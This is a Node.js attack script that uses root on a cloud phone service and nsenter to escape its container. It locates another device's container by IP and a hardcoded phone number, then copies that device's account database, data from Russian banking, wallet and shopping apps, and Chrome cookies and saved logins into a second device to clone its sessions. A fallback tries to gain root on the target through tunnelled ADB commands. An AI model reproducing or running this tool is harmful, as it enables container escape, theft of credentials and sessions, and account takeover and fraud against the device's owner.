#!/usr/bin/env node
/**
 * Root Data Inject: Extract ALL app data from .220 via container escape
 * and inject into D2 with proper ownership.
 * 
 * Approach A: nsenter from D1 (root syncCmd) → host /proc → .220 container PID → /proc/PID/root/data/
 * Approach B (fallback): Push su binary to .220 via ADB stream
 */
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');
const net = require('net');

// ═══════════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════════
const { AK, SK, HOST, D1, D2, CT, SHD } = require('../shared/vmos_api');
const D1_SERIAL = 'localhost:8479';
const D2_SERIAL = 'localhost:7391';
const SRC_IP = '10.0.26.220';
const OUT = path.join(__dirname, '..', 'output', 'clone_220_data');

const APPS = [
  'com.app.trademo', 'com.trademo.massmo', 'com.yandex.bank',
  'ru.cupis.wallet', 'ru.apteka', 'ru.getpharma.eapteka',
  'ru.vk.store', 'ru.yandex.taxi', 'ru.ozon.fintech.finance',
  'ru.ozon.app.android', 'ru.yoo.money', 'ru.rostel', 'com.wildberries.ru',
];

const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));
function ensureDir(d) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); return d; }

// ═══════════════════════════════════════════════════════════════
// VMOS API
// ═══════════════════════════════════════════════════════════════
function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8);
  const bh = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256', SK).update(sd).digest();
  k = crypto.createHmac('sha256', k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256', k).update('request').digest();
  const sig = crypto.createHmac('sha256', k).update(sts).digest('hex');
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${sig}` };
}

function apiPost(ep, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {});
    const h = sign(b);
    const buf = Buffer.from(b);
    const req = https.request({ hostname: HOST, path: ep, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 60) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1, raw: r.slice(0, 500) }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

// syncCmd returns output in errorMsg field (quirk of the API when running as root)

// Host namespace command via nsenter
async function hostCmd(cmd, sec) {
  return syncCmd(D1, `nsenter -t 1 -m -u -i -n -p -- sh -c '${cmd.replace(/'/g, "'\\''")}'`, sec);
}

// ═══════════════════════════════════════════════════════════════
// ADB Protocol (for Approach B - pushing su to .220)
// ═══════════════════════════════════════════════════════════════
const A_CNXN = 0x4e584e43, A_OPEN = 0x4e45504f, A_OKAY = 0x59414b4f;
const A_WRTE = 0x45545257, A_CLSE = 0x45534c43;
function makeHeader(cmd, a0, a1, dl, dc) { const h = Buffer.alloc(24); h.writeUInt32LE(cmd, 0); h.writeUInt32LE(a0, 4); h.writeUInt32LE(a1, 8); h.writeUInt32LE(dl, 12); h.writeUInt32LE(dc, 16); h.writeUInt32LE((cmd ^ 0xFFFFFFFF) >>> 0, 20); return h; }
function crc(d) { let s = 0; for (let i = 0; i < d.length; i++) s += d[i]; return s >>> 0; }
function makeCnxn() { const p = Buffer.from('host::\x00'); return Buffer.concat([makeHeader(A_CNXN, 0x01000000, 256 * 1024, p.length, crc(p)), p]); }
function makeOpen(lid, svc) { const p = Buffer.from(svc + '\x00'); return Buffer.concat([makeHeader(A_OPEN, lid, 0, p.length, crc(p)), p]); }
function makeOkay(lid, rid) { return makeHeader(A_OKAY, lid, rid, 0, 0); }
function parsePackets(buf) { const pkts = []; let o = 0; while (o + 24 <= buf.length) { const cmd = buf.readUInt32LE(o), a0 = buf.readUInt32LE(o + 4), a1 = buf.readUInt32LE(o + 8), dl = buf.readUInt32LE(o + 12); if (o + 24 + dl > buf.length) break; pkts.push({ cmd, arg0: a0, arg1: a1, data: buf.slice(o + 24, o + 24 + dl) }); o += 24 + dl; } return { packets: pkts, remaining: buf.slice(o) }; }

function adbExec220(cmd, sec) {
  return new Promise(resolve => {
    let trid = null, srid = null, sc = false, done = false, res = Buffer.alloc(0), buf = Buffer.alloc(0), tb = Buffer.alloc(0);
    const sock = net.createConnection(8479, '127.0.0.1', () => sock.write(makeCnxn()));
    const fin = () => { if (done) return; done = true; clearTimeout(t); try { sock.destroy(); } catch (e) {} resolve(res); };
    const t = setTimeout(fin, (sec || 30) * 1000);
    sock.on('data', chunk => {
      buf = Buffer.concat([buf, chunk]); const { packets: pp, remaining: r } = parsePackets(buf); buf = r;
      for (const p of pp) {
        if (p.cmd === A_CNXN && !trid) sock.write(makeOpen(1, `exec:nc ${SRC_IP} 5555`));
        else if (p.cmd === A_OKAY && p.arg1 === 1 && !trid) { trid = p.arg0; setTimeout(() => { const c = makeCnxn(); sock.write(Buffer.concat([makeHeader(A_WRTE, 1, trid, c.length, crc(c)), c])); }, 500); }
        else if (p.cmd === A_WRTE && p.arg1 === 1) {
          sock.write(makeOkay(1, trid)); tb = Buffer.concat([tb, p.data]); const inner = parsePackets(tb); tb = inner.remaining;
          for (const ip of inner.packets) {
            if (ip.cmd === A_CNXN && !sc) { sc = true; const q = Buffer.from('shell:' + cmd + '\x00'); const op = Buffer.concat([makeHeader(A_OPEN, 100, 0, q.length, crc(q)), q]); sock.write(Buffer.concat([makeHeader(A_WRTE, 1, trid, op.length, crc(op)), op])); }
            else if (ip.cmd === A_OKAY && ip.arg1 === 100) srid = ip.arg0;
            else if (ip.cmd === A_WRTE && ip.arg1 === 100) { res = Buffer.concat([res, ip.data]); const ok = makeOkay(100, srid); sock.write(Buffer.concat([makeHeader(A_WRTE, 1, trid, ok.length, crc(ok)), ok])); }
            else if (ip.cmd === A_CLSE) fin();
          }
        } else if (p.cmd === A_CLSE) fin();
      }
    });
    sock.on('error', fin); sock.on('close', fin);
  });
}

// ═══════════════════════════════════════════════════════════════
// APPROACH A: Container Escape via /proc
// ═══════════════════════════════════════════════════════════════
async function findContainerPID() {
  log('Scanning host /proc for .220 container...');

  // Method 1: Scan environ for IP or padCode
  const scan1 = await hostCmd(
    'for pid in $(ls /proc/ | grep "^[0-9]"); do ' +
    'if cat /proc/$pid/environ 2>/dev/null | tr "\\0" "\\n" | grep -q "10.0.26.220" 2>/dev/null; then ' +
    'echo "FOUND:$pid"; break; fi; done', 60);
  if (scan1.out.includes('FOUND:')) {
    const pid = scan1.out.match(/FOUND:(\d+)/)[1];
    log(`  Found via environ: PID ${pid}`);
    return pid;
  }

  // Method 2: Scan network namespaces for 10.0.26.220
  log('  Method 1 failed, trying network namespace scan...');
  const scan2 = await hostCmd(
    'for pid in $(ls /proc/ | grep "^[0-9]" | head -500); do ' +
    'ip=$(nsenter -t $pid -n -- ip addr 2>/dev/null | grep "10.0.26.220" 2>/dev/null); ' +
    'if [ -n "$ip" ]; then echo "FOUND:$pid"; break; fi; done', 90);
  if (scan2.out.includes('FOUND:')) {
    const pid = scan2.out.match(/FOUND:(\d+)/)[1];
    log(`  Found via netns: PID ${pid}`);
    return pid;
  }

  // Method 3: Scan all init processes and check their IPs
  log('  Method 2 failed, trying init process scan...');
  const scan3 = await hostCmd(
    'for pid in $(ls /proc/ | grep "^[0-9]"); do ' +
    'cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\\0" " "); ' +
    'if echo "$cmd" | grep -q "^/init" 2>/dev/null; then ' +
    'ip=$(cat /proc/$pid/net/fib_trie 2>/dev/null | grep -o "10\\.0\\.[0-9]*\\.[0-9]*" | sort -u); ' +
    'if echo "$ip" | grep -q "10.0.26.220"; then echo "FOUND:$pid"; break; fi; fi; done', 120);
  if (scan3.out.includes('FOUND:')) {
    const pid = scan3.out.match(/FOUND:(\d+)/)[1];
    log(`  Found via init scan: PID ${pid}`);
    return pid;
  }

  // Method 4: Check cgroup paths for container IDs
  log('  Method 3 failed, trying cgroup scan...');
  const scan4 = await hostCmd(
    'for pid in $(ls /proc/ | grep "^[0-9]" | head -300); do ' +
    'cg=$(cat /proc/$pid/cgroup 2>/dev/null); ' +
    'if [ -n "$cg" ] && echo "$cg" | grep -q "lxc\\|docker\\|container" 2>/dev/null; then ' +
    'root="/proc/$pid/root"; ' +
    'if [ -d "$root/data/app" ]; then ' +
    'ip=$(cat $root/data/property/persistent_properties 2>/dev/null | strings | grep "10.0.26.220" 2>/dev/null); ' +
    'phone=$(cat $root/data/property/persistent_properties 2>/dev/null | strings | grep "79286458086" 2>/dev/null); ' +
    'if [ -n "$ip" ] || [ -n "$phone" ]; then echo "FOUND:$pid"; break; fi; fi; fi; done', 120);
  if (scan4.out.includes('FOUND:')) {
    const pid = scan4.out.match(/FOUND:(\d+)/)[1];
    log(`  Found via cgroup/props: PID ${pid}`);
    return pid;
  }

  // Method 5: Brute force - check all PIDs with accessible root for .220's known phone number
  log('  Method 4 failed, trying brute force property scan...');
  const scan5 = await hostCmd(
    'for pid in $(ls /proc/ | grep "^[0-9]" | sort -n); do ' +
    'if [ -f "/proc/$pid/root/data/property/persistent_properties" ]; then ' +
    'if strings /proc/$pid/root/data/property/persistent_properties 2>/dev/null | grep -q "79286458086"; then ' +
    'echo "FOUND:$pid"; break; fi; fi; done', 180);
  if (scan5.out.includes('FOUND:')) {
    const pid = scan5.out.match(/FOUND:(\d+)/)[1];
    log(`  Found via brute force: PID ${pid}`);
    return pid;
  }

  return null;
}

async function extractViaContainer(pid) {
  const rootPath = `/proc/${pid}/root`;
  const dataDir = ensureDir(path.join(OUT, 'app_data'));
  const results = { accounts: null, apps: {}, chrome: {} };

  // 1. Verify access
  log('Verifying filesystem access...');
  const verify = await hostCmd(`ls ${rootPath}/data/data/ 2>&1 | head -5`, 15);
  if (!verify.ok || verify.out.includes('Permission denied') || verify.out.includes('No such file')) {
    log('  ✗ Cannot access container filesystem');
    return null;
  }
  log(`  ✓ Access confirmed: ${verify.out.split('\n').slice(0, 3).join(', ')}`);

  // 2. Extract accounts_ce.db
  log('Extracting accounts_ce.db...');
  const accB64 = await hostCmd(`base64 ${rootPath}/data/system_ce/0/accounts_ce.db 2>/dev/null`, 60);
  if (accB64.ok && accB64.out.length > 100 && !accB64.out.startsWith('[')) {
    const accFile = path.join(dataDir, 'accounts_ce.db');
    fs.writeFileSync(accFile, Buffer.from(accB64.out.replace(/\s/g, ''), 'base64'));
    log(`  ✓ accounts_ce.db: ${fs.statSync(accFile).size} bytes`);
    results.accounts = accFile;
  } else {
    log(`  ✗ accounts_ce.db not accessible`);
  }

  // 3. Extract per-app data for each installed app
  for (const pkg of APPS) {
    log(`Extracting data for ${pkg}...`);
    const pkgDir = ensureDir(path.join(dataDir, pkg));
    results.apps[pkg] = { databases: [], prefs: [] };

    // 3a. List databases
    const dbList = await hostCmd(`ls ${rootPath}/data/data/${pkg}/databases/ 2>/dev/null`, 15);
    if (dbList.ok && dbList.out.length > 0) {
      const dbs = dbList.out.split('\n').filter(f => f.endsWith('.db') || f.endsWith('.db-journal') || f.endsWith('.db-wal') || f.endsWith('.db-shm'));
      for (const db of dbs.slice(0, 10)) {
        if (!db.trim()) continue;
        const dbPath = `${rootPath}/data/data/${pkg}/databases/${db.trim()}`;
        // Check size first
        const sizeCheck = await hostCmd(`wc -c < ${dbPath} 2>/dev/null`, 10);
        const size = parseInt(sizeCheck.out) || 0;
        if (size > 5000000) { // Skip files > 5MB
          log(`    Skipping ${db.trim()} (${(size / 1024 / 1024).toFixed(1)}MB - too large for syncCmd)`);
          continue;
        }
        if (size === 0) continue;

        const b64 = await hostCmd(`base64 ${dbPath} 2>/dev/null`, 60);
        if (b64.ok && b64.out.length > 10 && !b64.out.startsWith('[')) {
          const outFile = path.join(pkgDir, `db_${db.trim()}`);
          fs.writeFileSync(outFile, Buffer.from(b64.out.replace(/\s/g, ''), 'base64'));
          results.apps[pkg].databases.push({ name: db.trim(), file: outFile, size: fs.statSync(outFile).size });
          log(`    ✓ ${db.trim()}: ${fs.statSync(outFile).size} bytes`);
        }
      }
    }

    // 3b. List shared_prefs
    const prefList = await hostCmd(`ls ${rootPath}/data/data/${pkg}/shared_prefs/ 2>/dev/null`, 15);
    if (prefList.ok && prefList.out.length > 0) {
      const prefs = prefList.out.split('\n').filter(f => f.endsWith('.xml'));
      for (const pref of prefs.slice(0, 15)) {
        if (!pref.trim()) continue;
        const prefPath = `${rootPath}/data/data/${pkg}/shared_prefs/${pref.trim()}`;
        const sizeCheck = await hostCmd(`wc -c < ${prefPath} 2>/dev/null`, 10);
        const size = parseInt(sizeCheck.out) || 0;
        if (size > 500000 || size === 0) continue;

        const b64 = await hostCmd(`base64 ${prefPath} 2>/dev/null`, 30);
        if (b64.ok && b64.out.length > 10 && !b64.out.startsWith('[')) {
          const outFile = path.join(pkgDir, `pref_${pref.trim()}`);
          fs.writeFileSync(outFile, Buffer.from(b64.out.replace(/\s/g, ''), 'base64'));
          results.apps[pkg].prefs.push({ name: pref.trim(), file: outFile, size: fs.statSync(outFile).size });
          log(`    ✓ ${pref.trim()}: ${fs.statSync(outFile).size} bytes`);
        }
      }
    }

    await sleep(500); // Rate limit
  }

  // 4. Chrome data
  log('Extracting Chrome data...');
  const chromeFiles = [
    { name: 'Cookies', path: 'app_chrome/Default/Cookies' },
    { name: 'Login Data', path: 'app_chrome/Default/Login Data' },
    { name: 'History', path: 'app_chrome/Default/History' },
    { name: 'Web Data', path: 'app_chrome/Default/Web Data' },
  ];
  for (const cf of chromeFiles) {
    const full = `${rootPath}/data/data/com.android.chrome/${cf.path}`;
    const sizeCheck = await hostCmd(`wc -c < "${full}" 2>/dev/null`, 10);
    const size = parseInt(sizeCheck.out) || 0;
    if (size > 0 && size < 5000000) {
      const b64 = await hostCmd(`base64 "${full}" 2>/dev/null`, 60);
      if (b64.ok && b64.out.length > 10) {
        const outFile = path.join(dataDir, `chrome_${cf.name.replace(/ /g, '_')}`);
        fs.writeFileSync(outFile, Buffer.from(b64.out.replace(/\s/g, ''), 'base64'));
        results.chrome[cf.name] = outFile;
        log(`  ✓ Chrome ${cf.name}: ${fs.statSync(outFile).size} bytes`);
      }
    }
  }

  return results;
}

// ═══════════════════════════════════════════════════════════════
// APPROACH B: Push su binary to .220
// ═══════════════════════════════════════════════════════════════
async function approachB_pushSu() {
  log('\n=== APPROACH B: Push su binary to .220 ===');

  // Get su binary from D1 (which has root via syncCmd)
  log('Extracting su/busybox from D1 for .220...');

  // Check what root-capable binaries exist on D1
  const bins = await syncCmd(D1, 'ls -la /system/xbin/su /system/bin/su /sbin/su /system/bin/busybox 2>&1; which toybox; file /system/bin/toybox 2>/dev/null', 15);
  log('  D1 binaries: ' + bins.out.slice(0, 200));

  // On VMOS, the shell itself runs as root via syncCmd, so we can use
  // D1's syncCmd to extract data from .220 by:
  // 1. Reading .220 files via nc relay (D1 runs nc as root)
  // 2. Or using D1's ADB tunnel with elevated privileges

  // First try: can D1's root syncCmd access .220 via nc?
  log('Testing root nc access to .220...');
  const ncTest = await syncCmd(D1,
    'echo "id" | nc -w 5 10.0.26.220 5555 2>&1 | head -c 200 | xxd | head -5', 15);
  log('  nc test: ' + ncTest.out.slice(0, 200));

  // Actually, the best approach B is to push a shell script to .220
  // that runs as root when called via our ADB stream
  // Let's try: use ADB stream to run su-equivalent commands
  log('Testing ADB stream with root tricks on .220...');

  // Try if .220 has any root methods
  const r220 = await adbExec220('id; which su; ls /system/xbin/su /system/bin/su 2>&1; getprop ro.debuggable', 10);
  log('  .220 root check: ' + r220.toString().slice(0, 200));

  // Try to push a helper script that uses available tools
  // On VMOS, the ADB daemon might accept root commands via specific service names
  // Try the "root:" service
  log('Testing ADB root service on .220...');
  const rootSvc = await new Promise(resolve => {
    let trid = null, sc = false, done = false, res = Buffer.alloc(0), buf = Buffer.alloc(0), tb = Buffer.alloc(0);
    const sock = net.createConnection(8479, '127.0.0.1', () => sock.write(makeCnxn()));
    const fin = () => { if (done) return; done = true; clearTimeout(timer); try { sock.destroy(); } catch (e) {} resolve(res.toString()); };
    const timer = setTimeout(fin, 15000);
    sock.on('data', chunk => {
      buf = Buffer.concat([buf, chunk]); const { packets: pp, remaining: r } = parsePackets(buf); buf = r;
      for (const p of pp) {
        if (p.cmd === A_CNXN && !trid) sock.write(makeOpen(1, `exec:nc ${SRC_IP} 5555`));
        else if (p.cmd === A_OKAY && p.arg1 === 1 && !trid) {
          trid = p.arg0;
          setTimeout(() => {
            const c = makeCnxn();
            sock.write(Buffer.concat([makeHeader(A_WRTE, 1, trid, c.length, crc(c)), c]));
          }, 500);
        }
        else if (p.cmd === A_WRTE && p.arg1 === 1) {
          sock.write(makeOkay(1, trid)); tb = Buffer.concat([tb, p.data]); const inner = parsePackets(tb); tb = inner.remaining;
          for (const ip of inner.packets) {
            if (ip.cmd === A_CNXN && !sc) {
              sc = true;
              // Try opening root: service
              const q = Buffer.from('root:\x00');
              const op = Buffer.concat([makeHeader(A_OPEN, 100, 0, q.length, crc(q)), q]);
              sock.write(Buffer.concat([makeHeader(A_WRTE, 1, trid, op.length, crc(op)), op]));
            }
            else if (ip.cmd === A_OKAY && ip.arg1 === 100) {
              res = Buffer.concat([res, Buffer.from('ROOT_OK ')]);
              // Now try shell as root
              const q2 = Buffer.from('shell:id\x00');
              const op2 = Buffer.concat([makeHeader(A_OPEN, 101, 0, q2.length, crc(q2)), q2]);
              sock.write(Buffer.concat([makeHeader(A_WRTE, 1, trid, op2.length, crc(op2)), op2]));
            }
            else if (ip.cmd === A_WRTE && ip.arg1 === 101) {
              res = Buffer.concat([res, ip.data]);
              const ok = makeOkay(101, ip.arg0);
              sock.write(Buffer.concat([makeHeader(A_WRTE, 1, trid, ok.length, crc(ok)), ok]));
            }
            else if (ip.cmd === A_CLSE) { /* ignore close */ }
          }
        }
        else if (p.cmd === A_CLSE) fin();
      }
    });
    sock.on('error', fin); sock.on('close', fin);
  });
  log('  Root service result: ' + rootSvc.slice(0, 200));

  return rootSvc.includes('uid=0') ? 'root_achieved' : null;
}

// ═══════════════════════════════════════════════════════════════
// DATA INJECTION INTO D2
// ═══════════════════════════════════════════════════════════════
async function injectIntoD2(extractedData) {
  log('\n══════════════════════════════════════════════');
  log('  INJECTING DATA INTO D2');
  log('══════════════════════════════════════════════');

  const stats = { success: 0, failed: 0, skipped: 0 };

  // Enable root on D2
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [D2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  await sleep(2000);

  // 1. Inject accounts_ce.db
  if (extractedData.accounts) {
    log('\n[1] Injecting accounts_ce.db...');
    const accData = fs.readFileSync(extractedData.accounts);
    const b64 = accData.toString('base64');

    // Stop account-related services
    await syncCmd(D2, 'am force-stop com.yandex.bank; am force-stop ru.ozon.fintech.finance', 10);

    const injected = await injectFileToD2(b64, '/data/system_ce/0/accounts_ce.db', 'accounts_ce.db');
    if (injected) {
      await syncCmd(D2, 'chmod 600 /data/system_ce/0/accounts_ce.db; chown system:system /data/system_ce/0/accounts_ce.db', 10);
      log('  ✓ accounts_ce.db injected');
      stats.success++;
    } else {
      log('  ✗ accounts_ce.db injection failed');
      stats.failed++;
    }
  }

  // 2. Inject per-app data
  for (const pkg of APPS) {
    const appData = extractedData.apps[pkg];
    if (!appData || (appData.databases.length === 0 && appData.prefs.length === 0)) {
      stats.skipped++;
      continue;
    }

    log(`\n[${pkg}]`);

    // Stop the app
    await syncCmd(D2, `am force-stop ${pkg}`, 5);

    // Get app UID on D2
    const uidResult = await syncCmd(D2, `stat -c %u /data/data/${pkg} 2>/dev/null || echo NODIR`, 10);
    const uid = uidResult.out === 'NODIR' ? null : uidResult.out.trim();
    if (!uid) {
      log(`  ✗ App not installed on D2, skipping`);
      stats.skipped++;
      continue;
    }

    // Inject databases
    for (const db of appData.databases) {
      const b64 = fs.readFileSync(db.file).toString('base64');
      const destPath = `/data/data/${pkg}/databases/${db.name}`;

      // Ensure databases dir exists
      await syncCmd(D2, `mkdir -p /data/data/${pkg}/databases`, 5);

      const injected = await injectFileToD2(b64, destPath, `${pkg}/${db.name}`);
      if (injected) {
        stats.success++;
        log(`  ✓ ${db.name} (${db.size} bytes)`);
      } else {
        stats.failed++;
        log(`  ✗ ${db.name}`);
      }
    }

    // Inject shared_prefs
    for (const pref of appData.prefs) {
      const b64 = fs.readFileSync(pref.file).toString('base64');
      const destPath = `/data/data/${pkg}/shared_prefs/${pref.name}`;

      // Ensure shared_prefs dir exists
      await syncCmd(D2, `mkdir -p /data/data/${pkg}/shared_prefs`, 5);

      const injected = await injectFileToD2(b64, destPath, `${pkg}/${pref.name}`);
      if (injected) {
        stats.success++;
        log(`  ✓ ${pref.name} (${pref.size} bytes)`);
      } else {
        stats.failed++;
        log(`  ✗ ${pref.name}`);
      }
    }

    // Fix ownership and SELinux context
    await syncCmd(D2, `chown -R ${uid}:${uid} /data/data/${pkg}/databases/ /data/data/${pkg}/shared_prefs/ 2>/dev/null`, 10);
    await syncCmd(D2, `restorecon -R /data/data/${pkg}/ 2>/dev/null`, 10);

    await sleep(300);
  }

  // 3. Inject Chrome data
  if (Object.keys(extractedData.chrome).length > 0) {
    log('\n[Chrome Data]');
    const chromeUid = await syncCmd(D2, 'stat -c %u /data/data/com.android.chrome 2>/dev/null || echo NODIR', 10);

    for (const [name, file] of Object.entries(extractedData.chrome)) {
      const b64 = fs.readFileSync(file).toString('base64');
      const destPath = `/data/data/com.android.chrome/app_chrome/Default/${name}`;
      await syncCmd(D2, 'mkdir -p /data/data/com.android.chrome/app_chrome/Default', 5);
      const injected = await injectFileToD2(b64, destPath, `chrome/${name}`);
      if (injected) {
        stats.success++;
        log(`  ✓ Chrome ${name}`);
      } else {
        stats.failed++;
      }
    }

    if (chromeUid.out !== 'NODIR') {
      await syncCmd(D2, `chown -R ${chromeUid.out.trim()}:${chromeUid.out.trim()} /data/data/com.android.chrome/ 2>/dev/null`, 10);
      await syncCmd(D2, 'restorecon -R /data/data/com.android.chrome/ 2>/dev/null', 10);
    }
  }

  return stats;
}

// Chunked file injection via syncCmd (handles files > 4KB command buffer)
const CHUNK_SIZE = 3000; // base64 chars per chunk
async function injectFileToD2(b64Data, destPath, label) {
  const clean = b64Data.replace(/\s/g, '');
  const chunks = [];
  for (let i = 0; i < clean.length; i += CHUNK_SIZE) {
    chunks.push(clean.slice(i, i + CHUNK_SIZE));
  }

  if (chunks.length === 1) {
    const cmd = `echo '${chunks[0]}' | base64 -d > "${destPath}" 2>/dev/null && echo OK`;
    const r = await syncCmd(D2, cmd, 30);
    return r.out.includes('OK');
  }

  // Multi-chunk
  const tmpFile = `/data/local/tmp/inject_${Date.now()}.tmp`;
  let cmd = `echo '${chunks[0]}' > "${tmpFile}" && echo OK`;
  let r = await syncCmd(D2, cmd, 30);
  if (!r.out.includes('OK')) return false;

  for (let i = 1; i < chunks.length; i++) {
    cmd = `echo '${chunks[i]}' >> "${tmpFile}" && echo OK`;
    r = await syncCmd(D2, cmd, 30);
    if (!r.out.includes('OK')) return false;
  }

  cmd = `base64 -d "${tmpFile}" > "${destPath}" && rm -f "${tmpFile}" && echo OK`;
  r = await syncCmd(D2, cmd, 45);
  return r.out.includes('OK');
}

// ═══════════════════════════════════════════════════════════════
// VERIFICATION
// ═══════════════════════════════════════════════════════════════
async function verify() {
  log('\n══════════════════════════════════════════════');
  log('  VERIFICATION');
  log('══════════════════════════════════════════════');

  // Check accounts
  const acc = await syncCmd(D2, 'dumpsys account 2>&1 | head -20', 15);
  log('D2 Accounts:\n' + acc.out);

  // Check app data exists
  for (const pkg of APPS.slice(0, 5)) {
    const check = await syncCmd(D2, `ls /data/data/${pkg}/databases/ 2>/dev/null | head -5; echo ---; ls /data/data/${pkg}/shared_prefs/ 2>/dev/null | head -5`, 10);
    log(`${pkg}: ${check.out.replace(/\n/g, ' | ')}`);
  }
}

// ═══════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════
async function main() {
  console.log('═'.repeat(60));
  console.log('  ROOT DATA INJECT: .220 → D2');
  console.log('═'.repeat(60));

  // Step 0: Enable root on D1 and D2
  log('Enabling root on D1 and D2...');
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [D1, D2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  await sleep(2000);

  // Verify root
  const rootCheck = await syncCmd(D1, 'id', 10);
  if (!rootCheck.out.includes('uid=0')) {
    log('✗ Root not available on D1: ' + rootCheck.out);
    return;
  }
  log('✓ D1 root confirmed: ' + rootCheck.out.split('\n')[0]);

  // ═══ APPROACH A: Container Escape ═══
  log('\n══════════════════════════════════════════════');
  log('  APPROACH A: CONTAINER ESCAPE VIA /proc');
  log('══════════════════════════════════════════════');

  const pid = await findContainerPID();
  let extractedData = null;

  if (pid) {
    log(`\n✓ Found .220 container at PID ${pid}`);
    extractedData = await extractViaContainer(pid);
  } else {
    log('\n✗ Could not find .220 container via /proc');
  }

  // ═══ APPROACH B: Fallback ═══
  if (!extractedData) {
    log('\n══════════════════════════════════════════════');
    log('  APPROACH B: PUSH SU / ROOT TRICKS ON .220');
    log('══════════════════════════════════════════════');
    const rootResult = await approachB_pushSu();
    if (rootResult === 'root_achieved') {
      log('Root achieved on .220 via ADB service!');
      // Re-extract with root
      // TODO: implement extraction via root ADB shell on .220
    } else {
      log('Approach B also failed to get root on .220');
    }
  }

  // ═══ INJECT INTO D2 ═══
  if (extractedData) {
    const stats = await injectIntoD2(extractedData);
    log(`\nInjection complete: ${stats.success} success, ${stats.failed} failed, ${stats.skipped} skipped`);

    // Verify
    await verify();
  }

  // ═══ SUMMARY ═══
  console.log('\n' + '═'.repeat(60));
  console.log('  SUMMARY');
  console.log('═'.repeat(60));
  if (extractedData) {
    const totalFiles = Object.values(extractedData.apps).reduce((s, a) => s + a.databases.length + a.prefs.length, 0);
    log(`Extracted: ${totalFiles} app data files + ${extractedData.accounts ? 'accounts_ce.db' : 'no accounts'} + ${Object.keys(extractedData.chrome).length} Chrome files`);
  } else {
    log('No data extracted - both approaches failed');
  }
  log('Done.');
}

main().catch(e => console.error('FATAL:', e));
